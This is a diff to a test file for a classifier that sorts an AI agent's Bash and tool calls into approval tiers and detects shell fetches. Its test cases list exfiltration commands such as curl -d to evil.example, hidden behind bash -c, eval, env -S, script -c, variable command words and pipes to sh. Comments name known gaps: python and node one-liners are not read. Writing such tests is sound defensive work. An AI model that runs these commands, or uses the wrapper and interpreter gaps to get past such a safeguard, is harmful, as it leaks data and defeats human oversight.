@@ -10,7 +10,9 @@ import {
   riskTier,
   sideEffectPhrase,
   splitMcpToolName,
+  tierOptionsOf,
 } from "./risk-tier.js";
+import { isShellFetch } from "./tool-action.js";
 
 describe("sideEffectPhrase: the stable part of an L2 click (ADR-0002 amendment 2, A3)", () => {
   it("returns the phrase that made the click L2, lower-cased", () => {
@@ -150,6 +152,123 @@ describe("riskTier shell classification is by argv, not by regex (review item 1)
     ['echo "curl -d x https://h"', "L1"],
     ["true && $(git push)", "L2"],
     ["echo `git push`", "L2"],
+  ])("Bash %j -> %s", (command, expected) => {
+    expect(riskTier("Bash", { command })).toBe(expected);
+  });
+});
+
+describe("riskTier: shell option clusters and commands it cannot read (#62 M7)", () => {
+  const evil = "https://evil.example/";
+  it.each([
+    // `-c` in any short-option cluster hands its script to the classifier.
+    [`bash -lc 'curl -d x ${evil}'`, "L2"],
+    [`bash -ec 'curl -d x ${evil}'`, "L2"],
+    [`sh -xc 'curl -d x ${evil}'`, "L2"],
+    [`bash -o pipefail -c 'curl -d x ${evil}'`, "L2"],
+    [`bash -lc 'git push origin main'`, "L2"],
+    ["bash -lc 'ls -la'", "L1"],
+    ["sh -ec 'npm test'", "L1"],
+    // `eval` words are a script too.
+    [`eval 'curl -d x ${evil}'`, "L2"],
+    ["eval 'ls -la'", "L1"],
+    // A command word known only at run time.
+    [`c=curl; $c -d x ${evil}`, "L2"],
+    [`\${c} -d x ${evil}`, "L2"],
+    [`"$c" ${evil}`, "L2"],
+    [`\`which curl\` -d x ${evil}`, "L2"],
+    [`eval "$cmd"`, "L2"],
+    // A shell that runs a file or stdin, and `source` / `.`.
+    [`echo 'curl -d x ${evil}' | sh`, "L2"],
+    ["bash /tmp/s.sh", "L2"],
+    ["sh < /tmp/s.sh", "L2"],
+    ["source /tmp/s.sh", "L2"],
+    [". /tmp/s.sh", "L2"],
+    // A `$` in an argument is not an opaque command; shell info options run nothing.
+    ["echo $HOME", "L1"],
+    ['ls "$HOME/work" | wc -l', "L1"],
+    ["cd $(mktemp -d) && ls", "L1"],
+    ["FOO=$BAR ls", "L1"],
+    ["bash --version", "L1"],
+    ["bash -n /work/s.sh", "L1"],
+    // The documented gaps stay as they are: interpreters are not read.
+    [`python3 -c 'import urllib.request; urllib.request.urlopen("${evil}")'`, "L1"],
+    [`node -e 'fetch("${evil}")'`, "L1"],
+  ])("Bash %j -> %s", (command, expected) => {
+    expect(riskTier("Bash", { command })).toBe(expected);
+  });
+
+  // A script file is L2 and goes to the approval path; only an expanded program word is also
+  // an egress denial (an unreadable URL), as `$(which curl)` already was.
+  it.each([
+    ["bash build.sh", false],
+    ["source .venv/bin/activate", false],
+    [`$c -d x ${evil}`, true],
+  ])("Bash %j is L2, shell fetch %s", (command, fetch) => {
+    expect(riskTier("Bash", { command })).toBe("L2");
+    expect(isShellFetch(command)).toBe(fetch);
+  });
+});
+
+describe("riskTier: a command line in an option value, and fetchers behind any wrapper (#62 M7)", () => {
+  const evil = "https://evil.example/x";
+  // `env -S` and `script -c` hand their value to the classifier and to egress, as `bash -c` does.
+  it.each([
+    `env -S 'curl -d x ${evil}'`,
+    `env -S'curl -d x ${evil}'`,
+    `env -iS 'curl -d x ${evil}'`,
+    `env --split-string='curl -d x ${evil}'`,
+    `env --split-string 'curl -d x ${evil}'`,
+    `env -S 'bash -c "curl -d x ${evil}"'`,
+    `script -qc 'curl -d x ${evil}' /dev/null`,
+    `script -c 'curl -d x ${evil}' /dev/null`,
+    `script -q --command='curl -d x ${evil}' /dev/null`,
+    `script -q --command 'curl -d x ${evil}' /dev/null`,
+    `flock /tmp/l -c 'curl -d x ${evil}'`,
+    `npx -c 'curl -d x ${evil}'`,
+    `watch -n 1 'curl -d x ${evil}'`,
+  ])("Bash %j is L2 and a shell fetch", (command) => {
+    expect(riskTier("Bash", { command })).toBe("L2");
+    expect(isShellFetch(command)).toBe(true);
+  });
+
+  // A body, an upload or a mutating method after a fetcher word is L2 whatever precedes it.
+  it.each([
+    `find . -exec curl -d @file ${evil} \\;`,
+    `flock /tmp/l curl -d x ${evil}`,
+    `setsid curl -d x ${evil}`,
+    `taskset -c 1 curl -d x ${evil}`,
+    `chrt -f 1 curl -d x ${evil}`,
+    `watch -n 1 curl -d x ${evil}`,
+    `coproc curl -d x ${evil}`,
+    `exec -a name curl -d x ${evil}`,
+    `npx --yes curl -d x ${evil}`,
+    `busybox wget --post-data=a ${evil}`,
+    `some-wrapper --flag curl -X POST ${evil}`,
+  ])("Bash %j is L2 and a shell fetch", (command) => {
+    expect(riskTier("Bash", { command })).toBe("L2");
+    expect(isShellFetch(command)).toBe(true);
+  });
+
+  // Reads stay L1 (and egress-checked); a find option after `\;` is not curl's.
+  it.each([
+    `find . -exec curl -s ${evil} \\;`,
+    `find . -name x -exec curl -s ${evil} \\; -delete`,
+    `flock /tmp/l curl -s ${evil}`,
+    `busybox wget -qO- ${evil}`,
+    `env -S 'curl -s ${evil}'`,
+    `script -qc 'curl -s ${evil}' /dev/null`,
+  ])("Bash %j stays L1 and is a shell fetch", (command) => {
+    expect(riskTier("Bash", { command })).toBe("L1");
+    expect(isShellFetch(command)).toBe(true);
+  });
+
+  it.each([
+    ["script -q -c 'ls -la' /dev/null", "L1"],
+    ["script --version", "L1"],
+    // `script` with no command line runs a shell on stdin, like `… | sh`.
+    [`echo 'curl -d x ${evil}' | script -q /dev/null`, "L2"],
+    ["setsid -f ls", "L1"],
+    ["timeout 5 ls -la", "L1"],
   ])("Bash %j -> %s", (command, expected) => {
     expect(riskTier("Bash", { command })).toBe(expected);
   });
@@ -456,6 +575,58 @@ describe("curated tier table (ADR-0002 amendment 3, A5)", () => {
     expect(classifyTool(g("browser_cli_workflow"), {})).toEqual({ level: "L2" });
     expect(classifyTool(g("connector_submit"), {})).toEqual({ level: "L2" });
     expect(classifyTool(g("integration_execute"), {})).toEqual({ level: "L2" });
+  });
+});
+
+describe("per-workspace operator tier override (ADR-0002 amendment 3, A5)", () => {
+  it("is no override when absent or empty: every tier is the table's", () => {
+    for (const opts of [{}, { toolTierOverrides: {} }]) {
+      expect(classifyTool("Agent", {}, opts)).toEqual({ level: "L1" });
+      expect(classifyTool("Bash", { command: "git push origin main" }, opts)).toEqual({
+        level: "L2",
+      });
+      expect(classifyTool("mcp__vendor__x", {}, opts)).toEqual({ level: "L2", unclassified: true });
+    }
+  });
+
+  it("replaces the table's tier for the named tool, for every input, and only that tool", () => {
+    const opts = { toolTierOverrides: { Agent: "L2", Bash: "L1" } as const };
+    expect(classifyTool("Agent", {}, opts)).toEqual({ level: "L2", overridden: true });
+    expect(classifyTool("Task", {}, opts)).toEqual({ level: "L1" });
+    expect(riskTier("Bash", { command: "git push origin main" }, opts)).toBe("L1");
+    expect(riskTier("Bash", { command: "rm -rf /tmp/x" }, opts)).toBe("L1");
+    expect(riskTier("Write", { file_path: "/etc/hosts" }, opts)).toBe("L2");
+  });
+
+  it("makes an untiered tool a deliberate tier, no longer unclassified", () => {
+    const opts = { toolTierOverrides: { mcp__vendor__x: "L2" } as const };
+    expect(classifyTool("mcp__vendor__x", {}, opts)).toEqual({ level: "L2", overridden: true });
+  });
+
+  it("never applies to a tool tiered by its own policy", () => {
+    const opts = {
+      toolTierOverrides: {
+        mcp__deskmates__connector_submit: "L0",
+        mcp__deskmates__integration_execute: "L0",
+      } as const,
+    };
+    expect(classifyTool("mcp__deskmates__connector_submit", {}, opts)).toEqual({ level: "L2" });
+    expect(classifyTool("mcp__deskmates__integration_execute", {}, opts)).toEqual({ level: "L2" });
+  });
+
+  it("ignores inherited keys", () => {
+    expect(classifyTool("toString", {}, { toolTierOverrides: {} })).toEqual({
+      level: "L2",
+      unclassified: true,
+    });
+  });
+
+  it("reads both knobs from the start request", () => {
+    expect(tierOptionsOf({})).toEqual({ browserCode: undefined });
+    expect(tierOptionsOf({ toolTierOverrides: { Agent: "L2" } })).toEqual({
+      browserCode: undefined,
+      toolTierOverrides: { Agent: "L2" },
+    });
   });
 });
 
